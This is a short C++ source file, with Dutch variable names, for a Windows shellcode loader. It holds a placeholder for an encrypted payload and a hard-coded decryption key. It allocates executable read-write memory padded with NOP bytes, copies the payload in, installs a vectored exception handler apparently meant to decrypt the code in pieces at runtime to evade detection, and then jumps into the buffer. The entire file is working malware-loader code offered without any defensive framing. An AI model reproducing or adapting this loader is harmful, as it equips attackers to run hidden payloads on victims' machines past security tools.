#include "SuperNormalPL.h"
#include "SuperNormalVG.h"

BYTE koffiekoek[] = { placeholder };  
DWORD koffiekoek_size = sizeof(koffiekoek);
std::string sleutel = "KoffieKoekDoeDecrypten";

INT main()
{
    
    DWORD totale_geheugengrootte = KOFFIEKOEK_PADDING + koffiekoek_size + KOFFIEKOEK_PADDING;

    
    PVOID toegewezen_geheugen = VirtualAlloc(NULL, totale_geheugengrootte, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!toegewezen_geheugen)
    {
        LogWinapiError("VirtualAlloc");
        return EXIT_FAILURE;
    }

    
    supernormal_lower_bound = (DWORD64)toegewezen_geheugen;
    supernormal_upper_bound = supernormal_lower_bound + totale_geheugengrootte;

    
    memset(toegewezen_geheugen, '\x90', totale_geheugengrootte);
    PVOID uitvoerbare_geheugenlocatie = (PBYTE)toegewezen_geheugen + KOFFIEKOEK_PADDING;
    memcpy(uitvoerbare_geheugenlocatie, koffiekoek, koffiekoek_size);

    
    supernormal_base = (DWORD64)uitvoerbare_geheugenlocatie;

    
    DWORD status = KoffieBreekPunt(uitvoerbare_geheugenlocatie);

    
    PVOID uitzondering_handler = AddVectoredExceptionHandler(1, &KoffieKoekAsmHeap);
    if (uitzondering_handler)
    {
        std::cout << "Gaat dit werken? Laten we het testen... :)" << std::endl;

        KoffIe functie = (KoffIe)uitvoerbare_geheugenlocatie;
        functie();
    }

    
    VirtualFree(toegewezen_geheugen, 0, MEM_RELEASE);
    return EXIT_SUCCESS;
}
